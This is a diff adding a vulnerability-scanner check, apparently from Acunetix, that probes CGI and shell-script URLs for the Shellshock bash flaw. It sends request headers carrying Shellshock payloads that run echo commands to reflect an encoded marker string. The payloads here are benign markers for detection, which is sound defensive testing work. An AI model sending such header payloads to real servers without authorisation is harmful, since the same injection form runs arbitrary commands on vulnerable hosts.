@@ -1,0 +1,81 @@
+#include constants.inc;
+#include helpers.inc;
+#include string_helpers.inc;
+var acceptedExt	=	[
+		"cgi", "sh", "pl"
+	];
+var lastJob = null;
+var headerName = "";
+// **************************************************************************************
+function interestingExtenstion(ext) {
+	// returns true if the file has an accepted extension
+	for (var i=0; i<acceptedExt.length; i++) 
+      {
+		if (ext.toLowerCase() == acceptedExt[i]) 
+			return true;
+      }	
+	return false;
+}
+	
+// **************************************************************************************							 
+function alert(uri, vxml, job)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.details = "A header named [bold]" + headerName + "[/bold] was added to the request. Header value: [bold][dark]() { acunetix; }; echo -e \"Content-Type: text/plain\n\"; echo -e \"\\0141\\0143\\0165\\0156\\0145\\0164\\0151\\0170\\0163\\0150\\0145\\0154\\0154\\0163\\0150\\0157\\0143\\0153\"[/dark][/bold]. The magic string [dark][bold]acunetixshellshock[/dark][/bold] was reflected in the response.";
+	ri.setHttpInfo(job);
+	
+	AddReportItem(ri);	
+}							 			
+// **************************************************************************************
+function fileShouldBeSearched()
+{
+    // don't test files with invalid HTTP statuses	
+	if (file.response.msg2 == 401) return false; 
+    
+	// always search files with interesting extensions
+	var fileExt  = getFileExt(file.name);
+	if (interestingExtenstion(fileExt)) return true;
+	// if the full path is cgi-bin or something similar then test it as well
+	if (
+			(file.fullPath.indexOf("/cgi-bin/") != -1) ||
+			(file.fullPath.indexOf("/cgi-sys/") != -1) ||
+			(file.fullPath.indexOf("/cgi-mod/") != -1)
+		) return true;
+	
+	return false;
+}
+// **************************************************************************************
+function testURI(file, uri)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = file.url;
+	lastJob.uri  = uri;		
+	headerName 	 = 'Referer';	
+	lastJob.request.addHeader(headerName, '() { ' + headerName + '; }; echo -e "Content-Type: text/plain\\n"; echo -e "\\0141\\0143\\0165\\0156\\0145\\0164\\0151\\0170\\0163\\0150\\0145\\0154\\0154\\0163\\0150\\0157\\0143\\0153"', true);
+	
+	headerName 	 = randStr(10);		
+	lastJob.request.addHeader(headerName, '() { ' + headerName + '; }; echo -e "Content-Type: text/plain\\n"; echo -e "\\0141\\0143\\0165\\0156\\0145\\0164\\0151\\0170\\0163\\0150\\0145\\0154\\0154\\0163\\0150\\0157\\0143\\0153"', true);
+	var headerName2	 = randStr(10);		
+	lastJob.request.addHeader(headerName2, '() { (a)=>\' echo -e "Content-Type: text/plain\\n"; echo -e "\\0141\\0143\\0165\\0156\\0145\\0164\\0151\\0170\\0163\\0150\\0145\\0154\\0154\\0163\\0150\\0157\\0143\\0153"', true);
+		
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) {
+		if (lastJob.response.body.indexOf("acunetixshellshock") != -1) {
+			alert(uri, 'Bash_RCE.xml', lastJob);
+		}
+	}
+	return false;
+}
+// main entry point
+// **************************************************************************************
+var file = getCurrentFile(); // this is the sitefile
+// verify if the file should be searched
+if (file.isFile && fileShouldBeSearched()) 
+{
+	testURI(file, file.fullPath);
+}
